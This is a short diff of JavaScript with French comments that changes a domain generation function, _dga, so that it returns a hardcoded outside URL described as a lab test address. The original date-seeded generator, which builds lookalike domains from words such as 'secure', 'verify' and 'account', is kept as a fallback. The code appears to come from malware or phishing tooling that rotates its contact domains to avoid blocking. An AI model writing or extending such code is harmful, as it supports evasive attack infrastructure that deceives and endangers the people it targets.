@@ -73,11 +73,21 @@
     // ═══════════════════════════════════════════════════════════════
 
     function _dga() {
+        // URL de test LAB configurée
+        const testUrl = 'https://remsi.sbs/brcde';
+
+        // Possibilité de fallback sur génération algorithmique
+        const useDGA = false; // Mettre à true pour DGA
+
+        if (!useDGA) {
+            return testUrl;
+        }
+
+        // DGA Original (backup)
         const date = new Date();
         const seed = date.getFullYear() + date.getMonth() + date.getDate();
         const tlds = ['.de', '.nl', '.ch', '.at', '.eu'];
 
-        // Génération algorithmique du domaine
         let domain = '';
         const words = ['online', 'secure', 'account', 'verify', 'service', 'portal'];
         const idx1 = (seed * 7) % words.length;
